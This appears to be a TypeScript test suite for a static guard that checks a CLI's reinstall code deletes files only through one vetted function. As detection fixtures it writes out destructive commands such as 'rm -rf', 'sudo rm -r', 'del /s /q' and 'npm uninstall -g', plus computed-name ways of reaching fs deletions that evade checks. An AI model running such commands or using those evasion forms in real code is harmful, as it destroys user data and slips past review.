  const CARRY = "  const done = await carryOut(p, {";
  const LOOK = "export function look(o: Looking): Inventory {";

  it("the folder is the five files this guard was written for", () => {
    expect(files).toEqual(["find.ts", "ours.ts", "page.ts", "plan.ts", "run.ts"]);
  }, 60_000);

  it("the patterns see a deletion however it is written", () => {
    for (const yes of [
      "rmSync(dir)",
      "fs.rmSync (dir)",
      "unlinkSync(f)",
      "rmdirSync(d)",
      "await rm(dir, { recursive: true })",
      "fs.promises.unlink(f)",
      "await fsp.rmdir(d)",
      'import { rmSync as take } from "node:fs";',
    ])
      expect(deletes(yes), yes).not.toEqual([]);
    for (const no of ["confirm(x)", "remove(what)", "d.remove(aside)", "uninstallService()", "a link is removed"])
      expect(deletes(no), no).toEqual([]);
    // A program handed a word that deletes: by an argv, or in a line for a shell.
    for (const yes of [
      'execCapture(["rm", "-rf", slot], { env: process.env })',
      'await npmDo(["uninstall", "--global", "--prefix", home, "sessionpipe"], { node })',
      'npmDo(["rm", "-g", "sessionpipe"], { node })',
      'npmDo(["un", "-g", "sessionpipe"], { node })',
      'npmDo(["prune"], { node })',
      'spawnSync("rmdir", [dir])',
      "spawn('unlink', [file])",
      q('execFileSync("/bin/sh", ["-c", `rm -rf @{dir}`])'),
      'execSync("sudo rm -r " + dir)',
      'execFile("cmd", ["/c", "del", file])',
      'spawnSync(\n    "npm",\n    ["uninstall", "-g", "sessionpipe"],\n  )',
    ])
      expect(argvDeletes(yes), yes).toHaveLength(1);
    for (const no of [
      'execCapture([...npmArgv(node), "prefix", "-g"], { env: process.env, timeoutMs: 20_000 })',
      q('npmDo(["cache", "add", `sessionpipe@@{v}`], { node })'),
      'spawnSync(process.execPath, [cli, "--version"], { encoding: "utf8", timeout: 20_000 })',
      q('npmDo(["install", "--global", "--prefix", prefix, `sessionpipe@@{v}`], { node })'),
      // Not a program: a pattern's own method, and a sentence.
      '/^(rm|del)$/.exec("rm")',
      'out("removed with rm -rf")',
    ])
      expect(argvDeletes(no), no).toEqual([]);
    // A command that deletes, as a word of its own.
    for (const yes of ['["rm", "-rf"]', q("`sudo rm -r @{dir}`"), '"rmdir"', "del /s", "rimraf dist"])
      expect(yes.match(COMMAND), yes).not.toBeNull();
    for (const no of ["rmSync(x)", "d.rm(x)", "confirm", "model", "unlinkSync", "format", "no-del", "rm-old", "x.del"])
      expect(no.match(COMMAND), no).toBeNull();
    // A member by a name that is made, held or quoted; and what these files do use.
    expect(computedWrong("fs", '"rm" + "Sync"')).toMatch(/of fs/);
    expect(computedWrong("fs", "0")).toMatch(/of fs/);
    expect(computedWrong("x", '"rm" + "Sync"')).toMatch(/made at run time/);
    expect(computedWrong("x", q("`rm@{kind}`"))).toMatch(/made at run time/);
    expect(computedWrong("x", '"rmSync"')).toMatch(/in a string/);
    expect(computedWrong("x", "name")).toMatch(/held in a variable/);
    expect(computedWrong(")", "pick()")).toMatch(/made at run time/);
    for (const [receiver, key] of [
      ["string", ""],
      ["live", "0"],
      [")", "0"],
      ["KIND", "kind"],
      ["VERB", "s.do"],
      ["Inventory", '"onPath"'],
      ["node_modules", "\\\\/"],
    ] as const)
      expect(computedWrong(receiver, key), `${receiver}[${key}]`).toBeNull();
  }, 60_000);

  it("a declaration is read whole, whatever its shape", () => {
    const text = [
      'import { a } from "./a.js";',
      "",
      "const one = (p: string): string => clean(p);",
      "",
      "function two(o: {",
      "  a: string;",
      "}): void {",
      "  if (o.a) {",
      "    rmSync(o.a);",
      "  }",
      "",
      "  done();",
      "}",
      "",
      "export const three = (c: Copy): string =>",
      "  c.uses",
      '    .join(", ");',
      "",
      "const FOUR = [",
      '  "x",',
      "] as const;",
      "",
      "export async function five(): Promise<void> {",
      "  await rm(dir);",
      "}",
      "export class Six extends Error {}",
    ].join("\n");
    expect(statement(text, "one")).toBe("const one = (p: string): string => clean(p);");
    expect(statement(text, "two")?.split("\n")).toHaveLength(9);
    expect(statement(text, "two")).toMatch(/^function two\(o: \{\n[\s\S]*\n {2}done\(\);\n\}$/);
    expect(statement(text, "three")).toBe('export const three = (c: Copy): string =>\n  c.uses\n    .join(", ");');
    expect(statement(text, "FOUR")).toBe('const FOUR = [\n  "x",\n] as const;');
    expect(statement(text, "five")).toBe("export async function five(): Promise<void> {\n  await rm(dir);\n}");
    expect(statement(text, "Six")).toBe("export class Six extends Error {}");
    expect(statement(text, "seven")).toBeNull();
    // A name that only begins the same is another declaration.
    expect(statement(text, "on")).toBeNull();
    expect(statement(text, "fiv")).toBeNull();
    // And of the real files: reinstall() by this reading is reinstall() by the other.
    expect(statement(CLI, "reinstall")).toBe(reinstallOf(CLI)?.trimEnd());
    for (const [file, name] of [
      [path.join(src, "launcher.ts"), "removeLauncher"],
      [path.join(src, "update.ts"), "npmDo"],
      [path.join(src, "update.ts"), "installInto"],
      [path.join(src, "current.ts"), "bringCurrent"],
      [path.join(folder, "ours.ts"), "remove"],
      [path.join(src, "cli.ts"), "copies"],
      [path.join(src, "cli.ts"), "versionRun"],
    ] as const) {
      const s = statement(read(file), name) as string;
      expect(s, name).toMatch(/\n\}$/);
      // Its brackets close: it was not cut short, and nothing after it was taken in.
      const count = (ch: string) => s.split(ch).length - 1;
      expect(count("{"), name).toBe(count("}"));
      expect(count("("), name).toBe(count(")"));
    }
    expect(
      imported(
        'import a, { b, type C, d as e } from "./x.js";\nimport type { F } from "./y.js";\nimport * as g from "node:fs";\n',
      ),
    ).toEqual(
      new Map([
        ["a", "./x.js"],
        ["b", "./x.js"],
        ["e", "./x.js"],
        ["g", "node:fs"],
      ]),
    );
  }, 60_000);

  it("only ours.ts names a deletion; every other file can only read; none runs a program, says uninstall, or reaches a member by a made-up name", () => {
    for (const name of files) expect(inModule(name, source(name)), name).toEqual([]);
    expect(fromFs(source("ours.ts"))).toEqual(expect.arrayContaining(OURS_ONLY));
    expect(fromFs(source("find.ts")).length).toBeGreaterThan(0);
    // The two lines that are only shown are there, once each, as this guard knows them.
    expect(code(source("find.ts")).split(VOLTA_LINE)).toHaveLength(2);
    expect(code(source("plan.ts")).split(SUDO_LINE)).toHaveLength(2);
    expect(source("find.ts").match(/uninstall/gi)).toHaveLength(1);
    // The comments say why npm is not asked; the code never names its uninstall.
    for (const name of files) expect(code(source(name)), name).not.toMatch(/npm uninstall|"uninstall"/);
  }, 60_000);

  it("M2: `npm uninstall`, or the word alone, fails the guard in any of the five files and in reinstall()", () => {
    for (const name of files) {
      const text = source(name);
      const first = text.indexOf("\nexport ");
      const put = (line: string) => `${text.slice(0, first)}\n${line}${text.slice(first)}`;
      expect(inModule(name, put('const gone = ["uninstall", "--global", "sessionpipe"];')), name).toContain(
        "says uninstall",
      );
      expect(inModule(name, put(q("const line = `sudo npm uninstall -g --prefix @{p} sessionpipe`;"))), name).toContain(
        "says uninstall",
      );
      expect(inModule(name, put("export const uninstallIt = 1;")), name).toContain("says uninstall");
      // A comment may say it: that is how the files say why they don't.
      expect(inModule(name, put("// Not `npm uninstall`: it takes whatever is at the command path.")), name).toEqual(
        [],
      );
    }
    // S2, which the guard before this one pinned as allowed.
    const s2 = before(
      CLI,
      CARRY,
      '  await npmDo(["uninstall", "--global", "--prefix", home, "sessionpipe"], { node });',
    );
    expect(inCli(s2)).toContain("says uninstall");
    expect(inCli(s2).join("\n")).toMatch(/starts a program with words this guard was not shown: npmDo\(\["uninstall"/);
    // As the wiring had it: npm handed to the removal.
    const old = CLI.replace(
      "    remove: async (what) => remove(what, proving),",
      '    remove: async (what) => remove(what, { ...proving, npm: (prefix) => npmDo(["uninstall", "--global", "--prefix", prefix, "sessionpipe"], { node }) }),',
    );
    expect(old).not.toBe(CLI);
    expect(inCli(old)).toContain("says uninstall");
    expect(inCli(before(CLI, CARRY, "  uninstallService();"))).toContain("says uninstall");
  }, 60_000);

  it("S1: a deletion behind an argv fails the guard: reinstall() starting `rm -rf` through execCapture, npm, or a shell", () => {
    const s1 = inCli(
      before(CLI, CARRY, '  await execCapture(["rm", "-rf", slot], { env: process.env, timeoutMs: 1000 });'),
    );
    expect(s1).toContain("names a command that deletes: rm");
    expect(s1.join("\n")).toMatch(
      /starts a program with words this guard was not shown: execCapture\(\["rm", "-rf", slot\]/,
    );
    for (const line of [
      '  await npmDo(["rm", "--global", "sessionpipe"], { node });',
      '  await npmDo(["prune", "--global"], { node });',
      '  spawnSync("rmdir", [slot]);',
      q('  execFileSync("/bin/sh", ["-c", `find @{slot} -delete`]);'),
      '  await execCapture(["del", "/s", "/q", slot], { env: process.env, timeoutMs: 1000 });',
      '  await execCapture(["unlink", slot], { env: process.env, timeoutMs: 1000 });',
      // Words this guard has no list for are still not the two it was shown.
      '  await execCapture(["find", slot, "-delete"], { env: process.env, timeoutMs: 1000 });',
      '  await execCapture([...npmArgv(node), "prefix", "-g", "--force"], { env: process.env, timeoutMs: 20_000 });',
    ])
      expect(inCli(before(CLI, CARRY, line)).join("\n"), line).toMatch(
        /starts a program with words this guard was not shown/,
      );
    // In a file of the module no program is started at all, with any words.
    for (const name of files) {
      const text = source(name);
      const first = text.indexOf("\nexport ");
      const put = (line: string) => `${text.slice(0, first)}\n${line}${text.slice(first)}`;
      expect(inModule(name, put('const gone = execCapture(["rm", "-rf", dir], {});')).join("\n"), name).toMatch(
        /starts a program: execCapture/,
      );
      expect(inModule(name, put('const gone = spawnSync("rm", ["-rf", dir]);')).join("\n"), name).toMatch(
        /starts a program: spawnSync/,
      );
      expect(inModule(name, put('const argv = ["rm", "-rf", dir];')), name).toContain(
        "names a command that deletes: rm",
      );
      expect(inModule(name, put('import { spawnSync } from "node:child_process";')), name).toContain(
        "takes child_process",
      );
    }
    // And what reinstall() does start is the two calls it was shown, each once.
    expect(runs(code(reinstallOf(CLI) as string)).map(squash)).toEqual(STARTS);
  }, 60_000);

  it("S3: a call from reinstall() to a function that deletes fails the guard, whether cli.ts declares it or takes it from a module", () => {
    // The reviewer's mutant: launcher.ts's removeLauncher(), which cli.ts imports.
    expect(deletes(statement(read(path.join(src, "launcher.ts")), "removeLauncher") as string)).not.toEqual([]);
    expect(imported(CLI).get("removeLauncher")).toBe("./launcher.js");
    expect(inCli(before(CLI, CARRY, "  removeLauncher();"))).toEqual(["uses removeLauncher, which deletes: rmSync"]);
    // S5: handed over in place of a dependency, called or not.
    expect(
      inCli(before(CLI, CARRY, "  const exists = (x: string) => (existsSync(x) ? (removeLauncher(), true) : false);")),
    ).toEqual(["uses removeLauncher, which deletes: rmSync"]);
    expect(inCli(CLI.replace("    rename: renameSync,\n", "    rename: removeLauncher,\n"))).toContain(
      "uses removeLauncher, which deletes: rmSync",
    );
    // A helper declared in cli.ts itself, in each shape a declaration has there.
    for (const helper of [
      "function wipe(dir: string): void {\n  rmSync(dir, { recursive: true, force: true });\n}",
      "async function wipe(dir: string): Promise<void> {\n  await rm(dir, { recursive: true });\n}",
      "const wipe = (dir: string): void => unlinkSync(dir);",
      "const wipe = (dir: string): void => {\n  for (const d of [dir]) rmdirSync(d);\n};",
      'function wipe(dir: string): void {\n  spawnSync("rm", ["-rf", dir]);\n}',
      'async function wipe(o: {\n  node: string;\n}): Promise<void> {\n  await npmDo(["uninstall", "--global", "sessionpipe"], o);\n}',
    ]) {
      const cli = `${before(CLI, CARRY, "  wipe(slot);")}\n${helper}\n`;
      expect(inCli(cli).join("\n"), helper).toMatch(/^uses wipe, which deletes: /);
      expect(inCli(cli), helper).toHaveLength(1);
      // Declared and not named in reinstall(): it is not reinstall()'s to answer for.
      expect(inCli(`${CLI}\n${helper}\n`), helper).toEqual([]);
    }
    // cli.ts has such functions, and reinstall() names none of them.
    const top = [...CLI.matchAll(/^(?:export\s+)?(?:async\s+)?function\*?\s+([A-Za-z_$][\w$]*)/gm)].map((m) => m[1]);
    const deleting = top.filter((name) => deletes(statement(CLI, name as string) as string).length > 0);
    expect(deleting.length).toBeGreaterThan(0);
    const words = new Set(code(reinstallOf(CLI) as string).match(/(?<![.\w$])[A-Za-z_$][\w$]*/g));
    for (const name of deleting) expect(words.has(name as string), name).toBe(false);
  }, 60_000);

  it("S6: a deletion by a computed name fails the guard: `fs[...]`, the module whole, a member by a name that is made or held", () => {
    // The reviewer's mutant, in find.ts.
    const wipe =
      'export const wipe = (fs: Record<string, (p: string, o: object) => void>, p: string): void => (fs["rm" + "Sync"] as (p: string, o: object) => void)(p, { recursive: true });';
    const s6 = inModule("find.ts", before(source("find.ts"), LOOK, wipe));
    expect(s6).toContain("names fs itself");
    expect(s6).toContain('fs["rm" + "Sync"]: a member of fs by a name made at run time');
    for (const name of files) {
      const text = source(name);
      const first = text.indexOf("\nexport ");
      const put = (line: string) => inModule(name, `${text.slice(0, first)}\n${line}${text.slice(first)}`);
      expect(put(wipe), name).toContain("names fs itself");
      // The module whole, by any name; and then a member of it.
      expect(put('import * as nodeFs from "node:fs";'), name).toContain("takes * from node:fs");
      expect(put('import nodeFs from "node:fs";'), name).toContain("takes * from node:fs");
      expect(put('import { rmSync as take } from "node:fs";').join("\n"), name).toMatch(
        /takes rmSync as take from node:fs/,
      );
      expect(put('const take = (m: Mod, p: string) => m["rm" + "Sync"](p);'), name).toContain(
        'm["rm" + "Sync"]: a member by a name made at run time',
      );
      expect(put(q("const take = (m: Mod, p: string) => m[`rm@{kind}`](p);")), name).toContain(
        q("m[`rm@{kind}`]: a member by a name made at run time"),
      );
      expect(put('const take = (m: Mod, p: string) => m["rmSync"](p);').join("\n"), name).toMatch(
        /names a deletion|in a string/,
      );
      expect(put("const take = (m: Mod, p: string, how: string) => m[how](p);"), name).toContain(
        "m[how]: a member by a name held in a variable",
      );
      expect(put("const take = (m: Mod, p: string) => m?.[pick()](p);"), name).toContain(
        "m[pick()]: a member by a name made at run time",
      );
      expect(put('const take = require("node:fs");'), name).toContain("loads a module by a call");
      expect(put('const take = await import("node:fs/promises");'), name).toContain("loads a module by a call");
      expect(put('const take = process.getBuiltinModule("node:fs");').join("\n"), name).toMatch(/reaches for process/);
    }
    // And in reinstall(), which may use node:fs by the names it was shown and no other way.
    for (const [line, said] of [
      ['  (fs as never as Record<string, (p: string) => void>)["rm" + "Sync"](slot);', /names fs itself/],
      ['  const take = process.getBuiltinModule("node:fs");', /reaches for process\.getBuiltinModule/],
      ['  const take = process["binding"]("fs");', /reaches for process by a computed name/],
      ['  const take = await import("node:fs/promises");', /loads "node:fs\/promises" by a call/],
      ['  const take = require("node:fs");', /reaches for a module or for code made at run time/],
      ["  rmSync(slot, { recursive: true });", /names a deletion: rmSync/],
      ["  writeFileSync(slot, '');", /uses of node:fs that write: writeFileSync renameSync mkdirSync symlinkSync/],
    ] as const)
      expect(inCli(before(CLI, CARRY, line)).join("\n"), line).toMatch(said);
  }, 60_000);

  it("run.ts carries a plan out through what it is handed, and is handed nothing that removes but ours.ts's removal", () => {
    // S4: a second dependency that deletes would be a member of `Doing` nobody listed.
    const text = source("run.ts");
    const doing = /export interface Doing \{\n[\s\S]*?\n\}/.exec(text)?.[0];
    const members = [...(doing as string).matchAll(/^ {2}([a-zA-Z]+)\??:/gm)].map((m) => m[1] as string);
    expect(members).toEqual([
      ...["say", "tilde", "fetch", "install", "exists", "rename", "id", "status", "health", "quiesce", "seed"],
      ...["stop", "use", "runningFrom", "same", "remove", "relink", "prove", "sleep", "now", "settleMs", "stopMs"],
    ]);
    const used = [...new Set([...code(text).matchAll(/\bd\.([a-zA-Z]+)\b/g)].map((m) => m[1] as string))];
    for (const u of used) expect(members, `d.${u}`).toContain(u);
    expect(members.filter((m) => /^(?:un|rm|del|wipe|purge|clear|drop)|uninstall|unserve/i.test(m))).toEqual([]);
    // What cli.ts hands it is those members and no other.
    const body = reinstallOf(CLI) as string;
    const from = body.indexOf(CARRY);
    const deps = body.slice(from, body.indexOf("\n  });\n", from));
    const handed = [...deps.matchAll(/^ {4}([a-zA-Z]+)(?::|,$)/gm)].map((m) => m[1] as string);
    expect(handed).toEqual(members.filter((m) => !["settleMs", "stopMs"].includes(m)));
  }, 60_000);

  it("in ours.ts every deletion is inside `remove`, the last function in the file", () => {
    const text = source("ours.ts");
    const start = text.indexOf("export function remove(asked: string, o: Proving): string[] {");
    expect(start).toBeGreaterThan(0);
    expect(text.indexOf("function remove(", start + 20)).toBe(-1);
    // It answers at once: not a promise, so nothing can be awaited inside it.
    expect(text).not.toMatch(/\basync\b|\bawait\b|Promise/);
    // Before it: the three names in the one import from node:fs, and nothing else.
    const taken = /^import \{[^}]*\} from "node:fs";$/m.exec(text) as RegExpExecArray;
    const early = deletes(text.slice(0, start));
    expect(early.map((d) => d.word)).toEqual(OURS_ONLY);
    for (const d of early) {
      expect(d.at).toBeGreaterThan(taken.index);
      expect(d.at).toBeLessThan(taken.index + taken[0].length);
    }
    // After it: the six uses, each a call, and no other function begins before the file ends.
    const body = text.slice(start);
    expect(deletes(body).map((d) => d.word)).toEqual([
      "unlinkSync",
      "rmSync",
      "rmSync",
      "rmSync",
      "rmdirSync",
      "unlinkSync",
    ]);
    // What each is handed: the path that was proven, an entry of it by a name a published
    // copy has, or a link the proof called its own.
    expect(
      body.match(
        /unlinkSync\(what\)|rmSync\(what, \{ recursive: true \}\)|rmSync\(path\.join\(what, e\), \{ recursive: true, force: true \}\)|rmSync\(path\.join\(what, "package\.json"\), \{ force: true \}\)|rmdirSync\(what\)|unlinkSync\(b\)/g,
      ),
    ).toHaveLength(6);
    expect(body.slice(1)).not.toMatch(/^(?:export\s+)?(?:async\s+)?(?:function|const|let|var|class)\b/m);
    expect(body.trimEnd().endsWith("\n}")).toBe(true);
    // Each is reached only past the proof.
    const proved = body.indexOf('if (p.is === "not") throw new NotOurs(what, p.why);');
    expect(proved).toBeGreaterThan(0);
    for (const d of deletes(body)) expect(d.at).toBeGreaterThan(proved);
    // And each by its own condition: a link alone only as the proof's answer; a folder
    // whole only where it is the one npm was told to install into; any other emptied by
    // the names a published copy has, its package.json after the rest, then the folder
    // itself, which goes only if it is empty; its links only after all of that.
    expect(body).toContain('if (p.is === "link") {\n    unlinkSync(what);\n    return [what];\n  }');
    const order = [
      "const bins = binsOf(what, o);",
      "if (p.staging) rmSync(what, { recursive: true });",
      "for (const e of REST) rmSync(path.join(what, e), { recursive: true, force: true });",
      'rmSync(path.join(what, "package.json"), { force: true });',
      "rmdirSync(what);",
      "} catch (e) {",
      "could only be removed in part",
      "for (const b of bins) unlinkSync(b);",
      "return [what, ...bins];",
    ].map((line) => body.indexOf(line));
    expect(order[0]).toBeGreaterThan(proved);
    for (const [i, at] of order.entries()) if (i) expect(at, String(i)).toBeGreaterThan(order[i - 1] as number);
    expect(text).toContain('const REST = ["dist", "README.md", "LICENSE", "NOTICE"] as const;');
    expect(text).toContain('const PUBLISHED: ReadonlySet<string> = new Set(["package.json", ...REST]);');
    // What is deleted is the one path that was proven: `what`, by its one spelling.
    expect(body).toContain("const what = path.resolve(asked);\n  const p = prove(what, o);");
    // (Its only other mention, comments apart, is the parameter itself.)
    expect(code(body).match(/\basked\b/g)).toHaveLength(2);
    // It takes the proof's terms and nothing else: no function comes in with them.
    const proving = /export interface Proving \{\n[\s\S]*?\n\}/.exec(text)?.[0] as string;
    expect([...proving.matchAll(/^ {2}([a-zA-Z]+)\??:/gm)].map((m) => m[1])).toEqual([
      "reach",
      "prefixes",
      "npx",
      "keep",
    ]);
    expect(code(proving)).not.toMatch(/=>|Promise|npm:|alone/);
  }, 60_000);

  it("cli.ts's reinstall() deletes nothing itself, nor one call away: its removal is ours.ts's; two renames and npm's own link are all it writes", () => {
    expect(inCli(CLI)).toEqual([]);
    expect(CLI).toMatch(/^import \{[^}]*\bremove\b[^}]*\} from "\.\/reinstall\/ours\.js";$/m);
    // The one `remove` in cli.ts is that import: nothing of the name is declared there.
    expect(CLI).not.toMatch(/\b(?:function|const|let|var)\s+remove\b/);
    expect(CLI.match(/\bremove\b[^"'\n]*from "/g)).toHaveLength(1);

    const body = reinstallOf(CLI) as string;
    expect(body).toContain(CARRY);
    expect(deletes(body)).toEqual([]);
    // Its `remove:` hands the path to ours.ts's `remove` with the proof's own terms, and
    // nothing else: no npm, no second way.
    expect(body).toContain("\n    remove: async (what) => remove(what, proving),\n");
    expect(body.match(/\bremove\(/g)).toHaveLength(1);
    // Those terms: what the look found, and the copy in the home, which is never removed.
    expect(body).toContain("const proving = { reach: inv.reach, prefixes: inv.prefixes, npx: inv.npx, keep: [slot] };");
    expect(body).toContain("const home = (p.home as NonNullable<typeof p.home>).prefix;\n  const slot = slotIn(home);");
    expect(body.match(/\bproving\b/g)).toHaveLength(2);
    // What it writes with node:fs: the renames of the swap, and one link, npm's own, made
    // (with the folder it goes in) where it is not there. Nothing else, by any name.
    expect(body).toMatch(/\n\s+rename: renameSync,\n/);
    expect(body.match(/\b\w+Sync\b/g)?.filter((w) => !["existsSync", "readFileSync"].includes(w))).toEqual(WRITES);
    // The link: inside `relink:`, in the prefix it was given, only where no link of npm's
    // is there, and with the very text npm writes for it.
    const from = body.indexOf("\n    relink: (prefix) => {\n");
    expect(from).toBeGreaterThan(0);
    const relink = body.slice(from, body.indexOf("\n    },\n", from));
    expect(body.match(/\bsymlinkSync\b/g)).toHaveLength(1);
    expect(body.match(/\bmkdirSync\b/g)).toHaveLength(1);
    expect(relink).toContain('const link = path.join(prefix, "bin", "sessionpipe");');
    expect(relink).toMatch(
      /if \(!binTarget\(link\)\)\s+try \{\s+mkdirSync\(path\.dirname\(link\), \{ recursive: true \}\);\s+symlinkSync\(path\.join\("\.\.", "lib", "node_modules", "sessionpipe", "dist", "cli\.js"\), link\);\s+\} catch \{\}/,
    );
    // That text is what this file's own links are made of, and what binTarget reads back.
    expect(INTO).toBe(path.join("..", "lib", "node_modules", "sessionpipe", "dist", "cli.js"));
    // The one sessionpipe it runs but itself is asked its version, by this node.
    expect(statement(CLI, "versionRun")).toContain('spawnSync(process.execPath, [cli, "--version"]');
  }, 60_000);

  it("what this guard does not see, shown: a deletion two calls away, and one built where no word of it is written", () => {
    // It reads text. It sees a deletion that is NAMED (rmSync, unlinkSync, rmdirSync, a
    // call of rm/unlink/rmdir, the word uninstall, a command that deletes as a word of
    // its own) in the five files, in reinstall(), and in the declaration of anything
    // reinstall() names that cli.ts declares or takes from a module of this package or of
    // core; any program reinstall() starts but the two it was shown; any use of node:fs
    // there but the ones it was shown. It does not see:
    //   - two calls away: a function reinstall() names that itself only calls one that
    //     deletes. That is how `bringCurrent`, `installInto` and `placeService`'s like
    //     work (update's own steps replace their own files), and nothing here tells
    //     their deletions from a new one. Shown below.
    //   - a name that is built: `"r" + "m"` handed to a program as a variable, a member
    //     of an object other than fs by a name held in a variable in cli.ts (only quoted
    //     and joined names are seen there), `Reflect.get`, a destructuring with a
    //     computed key.
    //   - a function that comes in from outside: a dependency of `carryOut` (their names
    //     are pinned, not what cli.ts binds them to beyond one call), a method of an
    //     object (`a.installed(…)`, `d.remove`, `rl.close`), a callback.
    //   - what a program does once started: npm's own `cache add` and `install`, the
    //     copy asked for its `--version`, launchctl and systemctl behind update's steps.
    //   - a module that is neither this package's nor core's, and a re-export under
    //     another name (a name that can't be found is passed over, not failed).
    //   - anything the tests of behaviour above would: this guard is the second line.
    const twoAway = `${before(CLI, CARRY, "  tidyUp(slot);")}\nfunction tidyUp(dir: string): void {\n  wipe(dir);\n}\nfunction wipe(dir: string): void {\n  rmSync(dir, { recursive: true });\n}\n`;
    expect(inCli(twoAway)).toEqual([]);
    const built = before(CLI, CARRY, '  const words = ["r" + "m", "-" + "rf"];\n  await later(words, slot);');
    expect(inCli(built)).toEqual([]);
    // One call away it is seen all the same.
    expect(
      inCli(`${before(CLI, CARRY, "  wipe(slot);")}\nfunction wipe(dir: string): void {\n  rmSync(dir);\n}\n`),
    ).toEqual(["uses wipe, which deletes: rmSync"]);
  }, 60_000);
});
